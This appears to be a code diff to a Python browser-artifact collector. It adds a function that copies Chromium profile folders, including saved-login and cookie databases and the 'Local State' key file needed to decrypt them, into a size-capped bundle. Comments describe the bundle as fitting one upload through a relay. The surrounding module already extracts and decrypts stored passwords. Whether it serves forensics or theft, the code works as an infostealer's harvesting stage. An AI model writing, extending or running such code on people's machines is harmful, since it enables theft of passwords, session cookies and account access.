@@ -28,7 +28,9 @@ from __future__ import annotations
 
 import base64
 import hashlib
+import shutil
 import sqlite3
+from collections.abc import Iterator
 from pathlib import Path
 from typing import Any, Final, NamedTuple
 
@@ -50,6 +52,58 @@ _MAX_HISTORY: Final[int] = 2000
 _MAX_DOWNLOADS: Final[int] = 1000
 _MAX_BOOKMARKS: Final[int] = 2000
 _MAX_BOOKMARK_DEPTH: Final[int] = 8
+
+# A Chromium profile is multi-gigabyte only because of its caches. Measured on a real
+# machine: Edge's Default is 2.2 GB and 2.0 GB of that is the directories below;
+# Brave's 3.2 GB is 3.0 GB of the same. Dropping them is the difference between a
+# folder grab nobody can move and one that fits in a single upload.
+_SKIP_DIRS: Final[frozenset[str]] = frozenset(
+    {
+        "Cache",
+        "Code Cache",
+        "GPUCache",
+        "GrShaderCache",
+        "ShaderCache",
+        "DawnGraphiteCache",
+        "DawnWebGPUCache",
+        "Service Worker",
+        "component_crx_cache",
+        "extensions_crx_cache",
+        "File System",
+        "blob_storage",
+        "Crashpad",
+        "BrowserMetrics",
+        "Safe Browsing",
+        "optimization_guide_model_store",
+        "OnDeviceHeadSuggestModel",
+        "WasmTtsEngine",
+        "CertificateRevocation",
+    }
+)
+
+# Real data, but not the part anyone reaches for first. Copied only after everything
+# else, and only until the budget is gone.
+_BULK_DIRS: Final[frozenset[str]] = frozenset(
+    {
+        "IndexedDB",
+        "Local Extension Settings",
+        "Extensions",
+        "Local Storage",
+        "Session Storage",
+        "Shared Dictionary",
+        "Web Applications",
+        "Storage",
+        "adblock_cache",
+        "sanitized_background_images",
+    }
+)
+
+# Per profile, across both passes. A machine with three profiles still produces one
+# archive under the relay's 2 GB ceiling; a machine with thirty does not, which is why
+# the number is here and not left to the disk.
+_MAX_BUNDLE_BYTES: Final[int] = 192 * 1024 * 1024
+_MAX_BUNDLE_FILES: Final[int] = 20_000
+_MAX_BUNDLE_FILE_BYTES: Final[int] = 64 * 1024 * 1024
 
 _WANTED_PASSWORDS: Final[tuple[str, ...]] = (
     "origin_url",
@@ -338,6 +392,106 @@ def _first_existing(profile: Path, relatives: tuple[str, ...]) -> Path | None:
     return None
 
 
+# --- profile bundle -----------------------------------------------------------
+
+
+def _bundle_files(profile: Path) -> Iterator[Path]:
+    """Every regular file under a live profile. Unreadable directories are skipped."""
+    try:
+        candidates = profile.rglob("*")
+        for path in candidates:
+            try:
+                if path.is_file():
+                    yield path
+            except OSError:
+                continue
+    except OSError:
+        log.logger.debug("chromium: cannot walk %s", profile, exc_info=True)
+
+
+def _bundle_one(source: Path, destination: Path, budget: int) -> tuple[int, int]:
+    """Copy one file inside the budget. Returns (files, bytes), zero on any refusal."""
+    try:
+        size = source.stat().st_size
+    except OSError:
+        return (0, 0)
+    if size <= 0 or size > budget or size > _MAX_BUNDLE_FILE_BYTES:
+        return (0, 0)
+    try:
+        destination.parent.mkdir(parents=True, exist_ok=True)
+        shutil.copy2(source, destination)
+    except OSError:
+        # A profile in use holds locks; a locked file costs that file, not the bundle.
+        log.logger.debug("chromium: bundle skipped %s", source, exc_info=True)
+        return (0, 0)
+    return (1, size)
+
+
+def bundle_profile(profile: Path, target: Path) -> int:
+    """Copy the profile folder, minus its caches, beside the parsed artifacts.
+
+    Two passes over one budget. The lean pass is everything outside ``_BULK_DIRS``:
+    ``Local State``, ``Network/``, ``Login Data``, ``Web Data``, ``History``. The bulk
+    pass is the databases behind IndexedDB, extension settings and local storage, and
+    it stops when the budget runs out.
+
+    Returns the number of files copied. The parsed JSON in the same directory is the
+    version that does not need a key; this is the bytes, for the rows a reader could
+    not open and for anything a browser adds next release.
+    """
+    destination = target / "profile"
+    lean: list[Path] = []
+    bulk: list[Path] = []
+
+    for path in _bundle_files(profile):
+        try:
+            parts = path.relative_to(profile).parts
+        except ValueError:
+            continue
+        if any(part in _SKIP_DIRS for part in parts[:-1]):
+            continue
+        if len(parts) > 1 and parts[0] in _BULK_DIRS:
+            bulk.append(path)
+        else:
+            lean.append(path)
+
+    budget = _MAX_BUNDLE_BYTES
+    copied = 0
+    written = 0
+
+    # Sorted so two runs over the same profile produce the same bundle, and so a
+    # budget that runs out takes the tail of an alphabetical list rather than
+    # whatever the filesystem happened to return first.
+    lean.sort()
+    bulk.sort()
+
+    for group in (lean, bulk):
+        for path in group:
+            if budget <= 0 or copied >= _MAX_BUNDLE_FILES:
+                break
+            try:
+                relative = path.relative_to(profile)
+            except ValueError:
+                continue
+            count, size = _bundle_one(path, destination / relative, budget)
+            copied += count
+            written += size
+            budget -= size
+
+    # ``Local State`` lives beside the profile, not inside it, and it is the file the
+    # whole key chain starts at: without it the copied databases are ciphertext.
+    state = profile.parent / "Local State"
+    if state.is_file():
+        count, size = _bundle_one(state, target / "Local State", budget)
+        copied += count
+        written += size
+
+    log.logger.debug(
+        "chromium: %s bundled %d files, %d bytes", profile.name, copied, written
+    )
+    return copied
+
+
 # --- artifacts ----------------------------------------------------------------
 
 
@@ -563,12 +717,18 @@ def run_profile(profile: Path, target: Path) -> int:
         written += _downloads(profile, scratch, target)
         written += _bookmarks(profile, target)
 
+    # One item, however many files it carries: the count is what the collector
+    # returned, and five thousand bundled files is still one collected artifact.
+    if bundle_profile(profile, target):
+        written += 1
+
     log.logger.debug("chromium: %s wrote %d", profile.name, written)
     return written
 
 
 __all__ = [
     "Keys",
+    "bundle_profile",
     "copy_database",
     "decrypt_value",
     "int_value",
